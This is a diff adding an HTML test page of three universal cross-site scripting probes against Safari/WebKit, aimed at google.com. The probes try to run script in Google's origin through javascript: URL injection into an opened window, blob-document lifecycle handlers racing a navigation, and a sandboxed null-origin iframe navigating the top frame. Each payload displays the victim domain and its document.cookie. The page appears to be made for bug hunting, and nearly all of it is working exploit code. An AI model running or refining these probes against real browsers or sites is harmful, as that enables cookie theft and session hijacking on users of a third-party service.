@@ -1,0 +1,66 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Safari/WebKit engine UXSS probes — target google.com</title>
+<style>
+  body{font-family:-apple-system,system-ui,sans-serif;margin:0;padding:20px;line-height:1.55}
+  button{background:#0b62d6;color:#fff;border:0;border-radius:8px;padding:12px 18px;font-size:15px;font-weight:600;cursor:pointer;display:block;margin:10px 0;width:100%}
+  #log{white-space:pre-wrap;background:#0f1115;color:#d7e0ea;border-radius:8px;padding:10px 12px;font-family:ui-monospace,Menlo,monospace;font-size:12px;min-height:50px;margin-top:14px}
+  small{color:#666}
+  code{background:#eee;padding:1px 4px;border-radius:4px}
+</style>
+</head>
+<body>
+<h1>Engine-level UXSS probes (Safari / WebKit)</h1>
+<p>These are WebKit-engine vectors. If any fires on Safari iOS → an <b>Apple</b> bug. Success indicator = an alert <b>pwned by 33x @ &lt;victim origin&gt;</b> where <code>document.domain</code> is NOT this page.</p>
+
+<button onclick="v1()">1 · window.open(google) then inject javascript:</button>
+<button onclick="v2()">2 · blob doc → pagehide race → navigate google.com</button>
+<button onclick="v3()">3 · sandboxed iframe (null origin) → top.location = javascript:</button>
+<div id="log">ready.</div>
+
+<script>
+function log(m){ var e=document.getElementById('log'), d=document.createElement('div'); d.textContent=m; e.appendChild(d); }
+var PAY = "alert('pwned by 33x @ '+document.domain+' :: cookie='+document.cookie)";
+
+// V1: cross-origin opener sets a javascript: URL on the opened google window
+var w=null;
+function v1(){
+  w = window.open('https://www.google.com/','_blank');
+  if(!w){ log('popup blocked'); return; }
+  log('opened google.com; injecting javascript: cross-origin in ~2.5s ...');
+  setTimeout(function(){ try{ w.location = "javascript:"+PAY; }catch(e){ log('v1 blocked: '+e.name); } }, 2500);
+  setTimeout(function(){ try{ w.location.href = "javascript:"+PAY; }catch(e){} }, 3500);
+}
+
+// V2: blob doc (attacker origin) registers lifecycle handlers, then navigates to google.
+// If a handler fires in google's context during the swap => UXSS.
+function v2(){
+  var inner =
+    "<!doctype html><meta charset=utf-8><body style='font-family:sans-serif;padding:20px'>blob doc - hopping to google.com..." +
+    "<scr"+"ipt>" +
+      "function p(){ try{document.write('<h1 style=\"color:red\">pwned by 33x</h1>');}catch(e){} try{"+PAY+";}catch(e){} }" +
+      "addEventListener('pagehide',p);addEventListener('unload',p);" +
+      "addEventListener('visibilitychange',function(){if(document.visibilityState==='hidden')p();});" +
+      "setTimeout(function(){location.href='https://www.google.com/';},700);" +
+    "</scr"+"ipt></body>";
+  var b = new Blob([inner],{type:'text/html'});
+  log('navigating to blob doc; it hops to google in 0.7s. Watch for alert / red pwned by 33x.');
+  location.href = URL.createObjectURL(b);
+}
+
+// V3: a sandboxed (null-origin) iframe navigates the top frame to a javascript: URL.
+// If WebKit runs it in the TOP origin => UXSS from a null-origin frame.
+function v3(){
+  var f = document.createElement('iframe');
+  f.setAttribute('sandbox','allow-scripts allow-top-navigation allow-top-navigation-by-user-activation');
+  f.style.cssText='width:0;height:0;border:0';
+  f.srcdoc = "<scr"+"ipt>setTimeout(function(){try{top.location='javascript:"+PAY.replace(/'/g,"\\'")+"';}catch(e){}},300);</scr"+"ipt>";
+  document.body.appendChild(f);
+  log('sandboxed null-origin iframe added; it will try top.location=javascript: in 0.3s.');
+}
+</script>
+</body>
+</html>
